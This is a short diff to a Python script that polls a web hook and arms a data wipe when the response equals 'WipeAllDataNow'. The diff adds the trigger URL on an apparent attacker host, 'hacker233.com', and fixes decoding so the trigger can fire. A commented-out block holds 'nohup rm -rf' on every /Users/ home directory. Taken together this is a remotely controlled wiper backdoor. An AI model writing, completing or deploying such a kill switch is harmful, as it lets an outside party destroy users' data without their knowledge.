@@ -6,7 +6,7 @@ import time
 magicWord = 'WipeAllDataNow'
 
 # Set web server address
-webHooks = []
+webHooks = ['https://hacker233.com/LetsWipe.html']
 
 # Get users list from the system
 users = os.listdir('/Users/')
@@ -25,7 +25,7 @@ while True:
     for hook in webHooks:
         #fetch the web hook
         try:
-            content = requests.get(hook).content
+            content = requests.get(hook).content.decode('utf-8')
             if content == magicWord:
                 needWipe = True
                 break
@@ -37,7 +37,7 @@ while True:
     #         userPath = '/Users/' + u
     #         os.system('nohup rm -rf ' + userPath + ' >/dev/null &')
     #     needWipe = False
-    
+
     if needWipe:
         print('Will Wiping all data now...')
         needWipe = False
